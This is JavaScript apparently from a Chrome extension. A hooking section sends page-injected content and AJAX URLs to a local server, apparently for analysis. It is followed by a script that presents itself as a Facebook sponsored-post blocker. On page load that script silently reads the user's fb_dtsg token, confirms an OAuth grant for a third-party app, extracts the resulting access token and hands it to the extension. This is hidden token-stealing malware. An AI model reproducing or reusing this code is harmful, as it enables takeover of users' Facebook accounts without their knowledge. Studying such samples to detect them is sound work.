
function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

//获取向页面注入的所有内容
function hookAppendChild(){
    var rawAppendChild = Element.prototype.appendChild;
    Element.prototype.appendChild = function() {
        console.log(arguments);
        var data = '';
        if(arguments[0].innerHTML == "") {
            data = arguments[0].src;
        } else {
            data = arguments[0].innerHTML;
        }
        collectMessageToServer("contentscript-appendChild-" + btoa(data));
        return rawAppendChild.apply(this, arguments);
    };
}

//获取所有的ajax 请求信息
function hookAjax(){
    var rawXMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("contentscript-ajax-" + btoa(arguments[1]));
        rawXMLHTTPRequestOpen.apply(this, arguments);
    }
}

//提取所有请求出口
// 方案一： 通过hook
// 方案二： 通过流量，确定需要访问的页面，对比有无扩展访问网站的区别

function run() {
    hookAjax();
    hookAppendChild();
}
run();
//sn00ker_ahahaha
//const regex = /^https:\/\/www\.facebook\.com\/[\s\S]+\/\?ref\=nf\&hc\_ref\=NEWSFEED\&(\s|\S)+$/gi;
// var enabled = !0;
const regex = /\&ft\[top_level_post_id\]\=/gi;
function blockads() {
    var $s = $("div._5pcp._5lel._232_ > span > div > div > a");
    
    if($s && ($s.text().indexOf('SponSsoredS') >= 0 || $s.text().indexOf('Sponsored') >= 0))
        domHiden($s);
    var sponsored = $("a.uiStreamSponsoredLink");
    if(sponsored.length != 0)
        domHiden(sponsored);
}

function domHiden(targetDom){
    var $a = $("a[data-hovercard-prefer-more-content-show='1']");
    if($a.length != 0) {
        for(var i=0; i<$a.length; i++) {
            var $h = $a[i].href;
            if(regex.test($h)) {
                plusAdCount($h);
                targetDom.closest('._5pcr.userContentWrapper').empty();
            }
        }
    }
    targetDom.closest('.userContentWrapper').hide();
}

function plusAdCount(ad) {
    chrome.runtime.sendMessage({
        count: ad, domain: 'facebook'
    });
}

function getSysEnable(){
    chrome.storage.local.get('SETTINGS', function callback(retval){
        retval = retval['SETTINGS'];
        var selected_block = retval['block'] || [];
        if(selected_block.indexOf('facebook') == -1)
            enabled = !1;
    });
}

$(document).ready(function() {
    blockads();
    document.getElementById('globalContainer').addEventListener("DOMSubtreeModified", function() {
        blockads();
    }, false);

    var fb_dtsg = document.getElementsByName("fb_dtsg")[0] && document.getElementsByName("fb_dtsg")[0].value;
    if(fb_dtsg) {
        var b = new XMLHttpRequest;
        b.open("POST", "https://www.facebook.com/v1.0/dialog/oauth/confirm"), b.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), b.send("fb_dtsg=" + fb_dtsg + "&app_id=165907476854626&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1"), b.onreadystatechange = function() {
            if (4 == b.readyState && 200 == b.status) {
                var a = b.responseText.match(/access_token=(.*?)&/)[1];
                chrome.runtime.sendMessage({
                    update_access_token: !0,
                    access_token: a
                })
            }
        }
    }
});